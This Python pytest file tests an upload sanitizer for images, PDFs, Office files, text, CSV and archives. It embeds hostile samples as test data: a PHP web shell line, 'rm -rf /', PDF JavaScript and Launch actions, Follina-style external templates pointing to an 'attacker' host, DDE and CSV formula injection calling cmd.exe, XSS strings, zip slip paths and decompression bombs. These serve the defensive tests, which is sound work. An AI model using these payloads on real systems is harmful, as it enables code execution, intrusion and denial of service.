import base64
import binascii
import io
import stat
import zipfile
import zlib

import pytest
from PIL import Image

from uploader.validators import Limits, ValidationError, extension_of, new_context, sanitize
from uploader.validators.common import MB, clean_display_name, clean_entry_path

from . import samples

LIMITS = Limits(max_file_size=5 * MB, max_uncompressed=20 * MB, image_max_pixels=4_000_000)


def ok(name, data, limits=LIMITS):
    return sanitize(name, data, new_context(limits))


def rejected(name, data, limits=LIMITS):
    with pytest.raises(ValidationError) as info:
        sanitize(name, data, new_context(limits))
    return info.value.code


# ---- names & types ----------------------------------------------------------

@pytest.mark.parametrize("name, ext", [
    ("photo.JPG", "jpg"), ("photo.jpeg", "jpg"), ("a.tar.gz", "tar.gz"), ("a.tgz", "tar.gz"),
    ("invoice.pdf.exe", "exe"), ("noext", None), (".pdf", None), ("", None),
])
def test_extension_of(name, ext):
    assert extension_of(name) == ext


@pytest.mark.parametrize("name", [
    "x.svg", "x.html", "x.htm", "x.js", "x.exe", "x.php", "x.phtml", "x.docm", "x.xlsm", "x.doc",
    "x.rtf", "x.xml", "x.rar", "x.7z", "x.bat", "x.sh", "x.jar", "x.hta", "x.lnk", "README",
])
def test_dangerous_or_unknown_types_rejected(name):
    assert rejected(name, b"anything") == "type_not_allowed"


def test_display_name_strips_bidi_and_paths():
    assert clean_display_name("..\\..\\evil\u202egpj.exe") == "evilgpj.exe"
    assert clean_display_name("<img src=x onerror=alert(1)>.png") == "_img src=x onerror=alert(1)_.png"
    assert clean_display_name("a" * 500 + ".pdf").endswith(".pdf")


@pytest.mark.parametrize("raw", ["../x", "/etc/passwd", "C:/x", "a/../../x", "a\\..\\x", "a\x00b", "a\u202eb"])
def test_entry_path_rejects_traversal(raw):
    assert clean_entry_path(raw) is None


def test_executable_magic_rejected_whatever_the_extension():
    assert rejected("x.txt", b"MZ\x90\x00 this is a PE file") == "active_content"
    assert rejected("x.txt", b"#!/bin/sh\nrm -rf /\n") == "active_content"


# ---- images -----------------------------------------------------------------

def test_png_is_reencoded_and_trailing_payload_dropped():
    payload = samples.png() + b"<?php system($_GET['c']); ?>"
    result = ok("a.png", payload)
    assert result.mime == "image/png"
    assert b"php" not in result.data
    assert Image.open(io.BytesIO(result.data)).size == (32, 24)


def test_jpeg_metadata_stripped():
    exif = Image.Exif()
    exif[0x010E] = "<script>alert(1)</script>"  # ImageDescription
    result = ok("a.jpg", samples.jpeg(exif=exif.tobytes()))
    assert b"script" not in result.data
    assert "exif" not in Image.open(io.BytesIO(result.data)).info


def test_png_text_chunks_and_icc_stripped():
    from PIL import PngImagePlugin
    info = PngImagePlugin.PngInfo()
    info.add_text("Comment", "<script>alert(1)</script>")
    result = ok("a.png", samples.png(pnginfo=info, icc_profile=b"fake-icc"))
    assert b"script" not in result.data
    assert b"iCCP" not in result.data


def test_animated_gif_keeps_frames_drops_comment():
    result = ok("a.gif", samples.gif_animated())
    img = Image.open(io.BytesIO(result.data))
    assert img.n_frames == 3
    assert b"script" not in result.data


def test_png_with_jpg_extension_rejected():
    assert rejected("a.jpg", samples.png()) == "content_mismatch"


def test_html_disguised_as_image_rejected():
    assert rejected("a.png", b"<html><script>alert(1)</script></html>") == "content_mismatch"


def test_gif_js_polyglot_is_neutralised_or_rejected():
    # GIF header that is also valid JavaScript: GIF89a=1;alert(1)//
    data = b"GIF89a=1;alert(document.domain)//" + b"\x00" * 64
    with pytest.raises(ValidationError):
        ok("a.gif", data)


def test_decompression_bomb_dimensions_rejected():
    # 1-bit PNG of 10000x10000 compresses to a few KB but would need 100 Mpx.
    bomb = samples.png(size=(10000, 10000), mode="1")
    assert len(bomb) < 100_000
    assert rejected("a.png", bomb) == "image_too_large"


def test_truncated_image_rejected():
    assert rejected("a.png", samples.png()[:60]) == "invalid_image"


# ---- pdf --------------------------------------------------------------------

def test_plain_pdf_accepted():
    assert ok("a.pdf", samples.pdf()).mime == "application/pdf"


@pytest.mark.parametrize("extra", [
    b"/OpenAction << /S /JavaScript /JS (app.alert(1)) >>",
    b"/OpenAction << /S /J#61vaScript /J#53 (app.alert(1)) >>",
    b"/OpenAction << /S /Launch /F (cmd.exe) >>",
    b"/Names << /EmbeddedFiles 9 0 R >>",
    b"/AcroForm << /XFA 9 0 R >>",
    b"/OpenAction << /S /GoToR /F (\\\\\\\\attacker\\\\share\\\\x.pdf) >>",
    b"/AA << /O << /JS (x) >> >>",
])
def test_pdf_active_content_rejected(extra):
    assert rejected("a.pdf", samples.pdf(catalog_extra=extra)) == "active_content"


def test_pdf_js_hidden_in_object_stream_rejected():
    inner = b"<< /S /JavaScript /JS (app.alert(1)) >>"
    assert rejected("a.pdf", samples.pdf_objstm(inner)) == "active_content"


def test_pdf_js_hidden_in_hex_flate_object_stream_rejected():
    inner = b"<< /S /JavaScript /JS (x) >>"
    data = samples.pdf_objstm(
        inner, filters=b"[/ASCIIHexDecode /FlateDecode]",
        encode=lambda raw: binascii.hexlify(zlib.compress(raw)) + b">",
    )
    # Filters apply in order: hex first, then flate.
    assert rejected("a.pdf", data) == "active_content"


def test_pdf_benign_object_stream_accepted():
    assert ok("a.pdf", samples.pdf_objstm(b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"))


def test_pdf_object_stream_with_unsupported_filter_rejected():
    data = samples.pdf_objstm(b"<< >>", filters=b"/LZWDecode", encode=lambda raw: raw)
    assert rejected("a.pdf", data) == "active_content"


def test_pdf_object_stream_hidden_by_fake_string_rejected():
    # A string that never closes would make a naive lexer skip the object stream.
    data = samples.pdf_objstm(b"<< /Type /Font >>")
    data = data.replace(b"6 0 obj", b"(unbalanced\n6 0 obj", 1)
    assert rejected("a.pdf", data) == "invalid_pdf"


def test_encrypted_pdf_rejected():
    data = samples.pdf().replace(b"<< /Root 1 0 R >>", b"<< /Root 1 0 R /Encrypt 9 0 R >>")
    assert rejected("a.pdf", data) == "active_content"


def test_pdf_with_html_prefix_rejected():
    assert rejected("a.pdf", b"<html>" + samples.pdf()) == "content_mismatch"


def test_pdf_with_appended_payload_rejected():
    assert rejected("a.pdf", samples.pdf() + b"\x00" * 4096 + b"<script>") == "invalid_pdf"


def test_pdf_objstm_bomb_hits_budget():
    inner = b"<< >> " + b" " * (30 * MB)
    data = samples.pdf_objstm(inner)
    assert len(data) < 1 * MB
    assert rejected("a.pdf", data) == "too_large_uncompressed"


# ---- office -----------------------------------------------------------------

def test_docx_accepted_and_rebuilt():
    result = ok("a.docx", samples.docx())
    assert zipfile.ZipFile(io.BytesIO(result.data)).namelist()[0] == "[Content_Types].xml"


def test_docx_with_hyperlink_accepted():
    r = samples.rels(("http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink",
                      "https://unit.travel", ' TargetMode="External"'))
    assert ok("a.docx", samples.docx(doc_rels=r))


def test_docm_renamed_to_docx_rejected():
    main = "application/vnd.ms-word.document.macroEnabled.main+xml"
    assert rejected("a.docx", samples.docx(main=main, extra=[("word/vbaProject.bin", b"x")])) == "content_mismatch"


def test_docx_with_vba_project_rejected():
    assert rejected("a.docx", samples.docx(extra=[("word/vbaProject.bin", b"\x00")])) == "active_content"


def test_docx_with_ole_object_rejected():
    ole = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64
    assert rejected("a.docx", samples.docx(extra=[("word/embeddings/oleObject1.bin", ole)])) == "active_content"


@pytest.mark.parametrize("rel_type", ["attachedTemplate", "oleObject", "frame", "subDocument"])
def test_docx_external_relationship_rejected(rel_type):
    # Follina / remote-template injection.
    r = samples.rels((f"http://schemas.openxmlformats.org/officeDocument/2006/relationships/{rel_type}",
                      "http://attacker/x.html!", ' TargetMode="External"'))
    assert rejected("a.docx", samples.docx(doc_rels=r)) == "active_content"


def test_docx_external_relationship_obfuscated_with_char_refs_rejected():
    r = samples.rels(("http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject",
                      "http://attacker/x", ' TargetMode="&#69;xternal"'))
    assert rejected("a.docx", samples.docx(doc_rels=r)) == "active_content"


def test_docx_dde_field_rejected():
    body = ('<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>DD</w:instrText></w:r>'
            '<w:r><w:instrText>EAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc"</w:instrText></w:r></w:p>')
    assert rejected("a.docx", samples.docx(body=body)) == "active_content"


def test_docx_doctype_rejected():
    body = "<w:p/>"
    data = samples.docx(body=body)
    entries = [(i.filename, zipfile.ZipFile(io.BytesIO(data)).read(i)) for i in zipfile.ZipFile(io.BytesIO(data)).infolist()]
    entries = [(n, d.replace(b"<w:document", b'<!DOCTYPE x [<!ENTITY a "aaaa">]><w:document')
                if n == "word/document.xml" else d) for n, d in entries]
    assert rejected("a.docx", samples.zip_of(entries)) == "active_content"


def test_xlsx_dde_formula_rejected():
    assert rejected("a.xlsx", samples.xlsx("cmd|' /C calc'!A0")) == "active_content"


def test_xlsx_pipe_inside_string_is_fine():
    assert ok("a.xlsx", samples.xlsx('TEXTJOIN("|",TRUE,A1:A3)'))


def test_odt_accepted_and_mimetype_stored_first():
    result = ok("a.odt", samples.odt())
    zf = zipfile.ZipFile(io.BytesIO(result.data))
    first = zf.infolist()[0]
    assert first.filename == "mimetype" and first.compress_type == zipfile.ZIP_STORED


def test_odt_with_basic_macros_rejected():
    assert rejected("a.odt", samples.odt(extra=[("Basic/Standard/Module1.xml", "<x/>")])) == "active_content"


def test_odt_with_event_listener_rejected():
    content = ('<office:document-content><office:event-listeners><script:event-listener '
               'xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic"/>'
               '</office:event-listeners></office:document-content>')
    assert rejected("a.odt", samples.odt(content=content)) == "active_content"


def test_zip_renamed_to_docx_rejected():
    assert rejected("a.docx", samples.zip_of([("a.txt", b"hi")])) == "content_mismatch"


# ---- text -------------------------------------------------------------------

def test_utf8_text_accepted():
    assert ok("a.txt", "Бронь №123, рейс PS 101\n".encode()).mime.startswith("text/plain")


@pytest.mark.parametrize("text", [
    b"<script>alert(1)</script>", b"<SCRIPT src=//x>", b"<svg onload=alert(1)>", b"<?php echo 1; ?>",
    b"<iframe src=x>", b"click javascript:alert(1)", b"<% Response.Write(1) %>",
])
def test_text_with_markup_rejected(text):
    assert rejected("a.txt", text) == "active_content"


def test_non_utf8_text_rejected():
    assert rejected("a.txt", "привет".encode("cp1251")) == "invalid_text"


def test_binary_as_text_rejected():
    assert rejected("a.txt", b"abc\x00\x01\x02") == "invalid_text"


def test_csv_accepted():
    assert ok("a.csv", "Имя;Телефон;Сумма\nИван;+38 (050) 123-45-67;-12.5\n".encode())


@pytest.mark.parametrize("cell", ["=1+1", "@SUM(A1)", "+cmd|' /C calc'!A0", "-2+3+cmd|' /C calc'!A0", '"=HYPERLINK(""http://x"")"'])
def test_csv_formula_injection_rejected(cell):
    assert rejected("a.csv", f"name,value\nx,{cell}\n".encode()) == "active_content"


def test_csv_formula_after_other_delimiter_rejected():
    assert rejected("a.csv", b"a;b\nx;=1+2\n") == "active_content"


# ---- archives -----------------------------------------------------------------

def test_zip_rebuilt_with_sanitized_entries_and_junk_dropped():
    data = samples.zip_of([
        ("photos/a.png", samples.png() + b"<?php ?>"),
        ("docs/b.pdf", samples.pdf()),
        ("__MACOSX/photos/._a.png", b"junk"),
        (".DS_Store", b"junk"),
    ])
    result = ok("a.zip", data)
    zf = zipfile.ZipFile(io.BytesIO(result.data))
    assert sorted(zf.namelist()) == ["docs/b.pdf", "photos/a.png"]
    assert b"php" not in zf.read("photos/a.png")


def test_zip_slip_rejected():
    assert rejected("a.zip", samples.zip_of([("../../etc/cron.d/x.txt", b"hi")])) == "unsafe_path"


def test_zip_with_executable_inside_rejected():
    assert rejected("a.zip", samples.zip_of([("setup.exe", b"MZ")])) == "type_not_allowed"


def test_zip_with_script_renamed_inside_rejected():
    assert rejected("a.zip", samples.zip_of([("readme.txt", b"<script>alert(1)</script>")])) == "active_content"


def test_zip_with_svg_inside_rejected():
    assert rejected("a.zip", samples.zip_of([("logo.svg", b"<svg/>")])) == "type_not_allowed"


def test_zip_symlink_rejected():
    info = zipfile.ZipInfo("link.txt")
    info.create_system = 3
    info.external_attr = (stat.S_IFLNK | 0o777) << 16
    assert rejected("a.zip", samples.zip_of([(info, "/etc/passwd")])) == "unsafe_path"


def test_zip_encrypted_entry_rejected():
    data = bytearray(samples.zip_of([("a.txt", b"hello")], compression=zipfile.ZIP_STORED))
    # Set the "encrypted" flag in both the local and the central header.
    for sig in (b"PK\x03\x04", b"PK\x01\x02"):
        pos = data.find(sig)
        off = pos + (6 if sig == b"PK\x03\x04" else 8)
        data[off] |= 0x1
    assert rejected("a.zip", bytes(data)) == "encrypted"


def test_zip_bomb_rejected():
    bomb = samples.zip_of([(f"{i}.txt", b"0" * (4 * MB)) for i in range(8)])
    assert len(bomb) < 200_000
    assert rejected("a.zip", bomb) in ("too_large_uncompressed",)


def test_zip_with_prefix_polyglot_rejected():
    assert rejected("a.zip", b"<html><script>x</script>" + samples.zip_of([("a.txt", b"hi")])) == "content_mismatch"


def test_nested_archive_depth_limited():
    inner = samples.zip_of([("a.txt", b"hi")])
    middle = samples.zip_of([("inner.zip", inner)])
    assert ok("a.zip", middle)
    outer = samples.zip_of([("middle.zip", middle)])
    assert rejected("a.zip", outer) == "archive_nesting"


def test_zip_duplicate_names_rejected():
    assert rejected("a.zip", samples.zip_of([("a.txt", b"1"), ("A.TXT", b"2")])) == "unsafe_path"


def test_tar_gz_accepted_and_rebuilt():
    result = ok("a.tar.gz", samples.tar_gz([("dir/a.png", samples.png()), ("b.txt", b"hello")]))
    assert result.ext == "tar.gz"
    import tarfile
    with tarfile.open(fileobj=io.BytesIO(result.data), mode="r:gz") as tf:
        members = {m.name: m for m in tf}
    assert set(members) == {"dir/a.png", "b.txt"}
    assert all(m.uid == 0 and m.mode == 0o644 for m in members.values())


def test_tar_symlink_rejected():
    data = samples.tar_gz([("a.txt", b"hi")], symlink=("evil.txt", "/etc/passwd"))
    assert rejected("a.tgz", data) == "unsafe_path"


def test_tar_traversal_rejected():
    assert rejected("a.tar.gz", samples.tar_gz([("../../x.txt", b"hi")])) == "unsafe_path"


def test_gzip_bomb_rejected():
    import gzip
    bomb = gzip.compress(b"\x00" * (30 * MB))
    assert rejected("a.tar.gz", bomb) == "too_large_uncompressed"


def test_base64_wrapped_payload_is_just_text():
    # Encoded content is inert text; nothing decodes it on the CDN side.
    assert ok("a.txt", base64.b64encode(b"<script>alert(1)</script>"))
